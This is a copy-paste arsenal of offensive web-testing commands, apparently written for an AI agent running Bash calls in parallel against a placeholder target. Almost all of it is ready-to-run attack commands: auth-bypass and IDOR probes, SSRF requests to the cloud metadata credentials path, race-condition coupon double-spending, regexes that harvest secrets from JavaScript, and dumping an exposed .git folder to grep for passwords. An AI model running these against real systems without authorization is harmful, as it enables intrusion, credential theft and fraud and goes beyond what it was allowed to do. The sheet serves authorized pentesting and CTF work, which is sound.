# Speed Commands — copy-paste operational arsenal

Fast hunting = the right commands, run in parallel, no time wasted typing. Copy-paste-ready. `recon-and-fuzzing.md` covers *discovery* depth; this is the *fast testing* arsenal. Proxy assumed at `127.0.0.1:8080` (Burp) so everything is captured and replayable.

> Authorized lab / CTF / scoped-engagement only. Throttle to scope; don't DoS.

---

## Parallel-execution rule
Independent commands run **in parallel** (multiple Bash calls in one message): recon enum, content discovery, port scan, JS pull. Keep sequential only what truly depends on a prior result (e.g. extract-from-JS needs the JS-file list first).

---

## Recon blitz (run all in parallel)
```bash
# 1 subdomains → live hosts (in-scope only)
subfinder -d TARGET -all -silent | httpx -silent -title -status-code -tech-detect -o live.txt
# 2 crawl + JS endpoints
katana -u https://TARGET -d 3 -jc -silent -o urls.txt
# 3 content discovery
feroxbuster -u https://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 --smart -o dirs.txt
# 4 port/service
nmap -sV -sC --top-ports 1000 -T4 TARGET -oN nmap.txt
```

## Fast initial probe (parallel)
```bash
curl -sk -x http://127.0.0.1:8080 -D- "https://TARGET/" -o /dev/null | head -30          # tech fingerprint
for p in robots.txt sitemap.xml .well-known/security.txt .git/HEAD .env swagger.json openapi.json graphql; do
  printf '%s ' "$p"; curl -sk -x http://127.0.0.1:8080 -o /dev/null -w "%{http_code}\n" "https://TARGET/$p"; done
wafw00f https://TARGET 2>/dev/null                                                         # WAF
```

## IDOR speed test (two-account — your token, victim's ids)
```bash
for ep in profile orders settings payments export delete; do
  curl -sk -x http://127.0.0.1:8080 -H "Authorization: Bearer YOUR_TOKEN" \
    -w " [%{http_code}] $ep\n" "https://TARGET/api/users/VICTIM_ID/$ep"; done
# read the BODY, not just the code — 200 alone ≠ proof
```

## Auth-bypass speed test (parallel)
```bash
curl -sk -x http://127.0.0.1:8080 "https://TARGET/api/admin/users"                  # no auth
curl -sk -x http://127.0.0.1:8080 -H "Authorization: Bearer " "https://TARGET/api/admin/users"   # empty bearer
curl -sk -x http://127.0.0.1:8080 -X PUT "https://TARGET/api/admin/users"           # method swap
curl -sk -x http://127.0.0.1:8080 "https://TARGET/api/..;/admin/users"              # path bypass
curl -sk -x http://127.0.0.1:8080 -H "X-Original-URL: /admin/users" "https://TARGET/"  # header override
curl -sk -x http://127.0.0.1:8080 "https://TARGET/api/Admin/Users"                  # case
```

## SSRF quick test (parallel)
```bash
curl -sk -x http://127.0.0.1:8080 "https://TARGET/api/fetch?url=http://127.0.0.1"
curl -sk -x http://127.0.0.1:8080 "https://TARGET/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -sk -x http://127.0.0.1:8080 "https://TARGET/api/fetch?url=http://0x7f000001"           # decimal/hex IP bypass
curl -sk -x http://127.0.0.1:8080 "https://TARGET/api/fetch?url=http://YOUR-COLLAB"           # blind → OAST
```

## Race condition — single packet (limit overrun / double-spend)
```bash
# 10 identical requests as simultaneously as possible
seq 1 10 | parallel -j10 "curl -sk -x http://127.0.0.1:8080 -X POST \
  -H 'Authorization: Bearer TOKEN' -H 'Content-Type: application/json' \
  -d '{\"coupon\":\"DISCOUNT50\"}' 'https://TARGET/api/apply-coupon' -w '%{http_code}\n' -o /dev/null"
# better: Burp Repeater 'send group in parallel (single connection)' or Turbo Intruder single-packet attack
```

## JS secrets + endpoints (sequential: list → extract)
```bash
katana -u https://TARGET -jc -d 2 -ef css,png,jpg,gif,svg,woff -silent | grep '\.js$' | sort -u > js.txt
cat js.txt | while read u; do curl -sk "$u" | \
  grep -oE "(api[_-]?key|apikey|secret|token|password|AKIA[A-Z0-9]{16}|sk_live_|pk_live_)['\"]?\s*[:=]\s*['\"][A-Za-z0-9/+=_-]{10,}['\"]"; done | sort -u > js_secrets.txt
cat js.txt | while read u; do linkfinder -i "$u" -o cli 2>/dev/null; done | sort -u > js_endpoints.txt
```

## Param / vhost fuzz (background, long-running)
```bash
ffuf -u "https://TARGET/api/endpoint?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs 0 -t 30
ffuf -u "https://TARGET/" -H "Host: FUZZ.TARGET" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs DEFAULT_SIZE -t 30   # in-scope vhosts only
```

## Exposed git → source
```bash
curl -sk -x http://127.0.0.1:8080 "https://TARGET/.git/HEAD"          # 200 + "ref: refs/..." = exposed
git-dumper https://TARGET/.git/ ./git_dump && cd git_dump && git log -p | grep -iE 'password|secret|key'
```

## Targeted CVE scan (after fingerprinting the stack)
```bash
nuclei -u https://TARGET -severity critical,high -o nuclei.txt
nuclei -u https://TARGET -tags cve,exposure,misconfig -severity critical,high,medium
```

**Adapt, don't run blind** — pick the commands that fit *this* target (`attack-engine.md` adaptive rules). Know what a positive looks like before you fire.
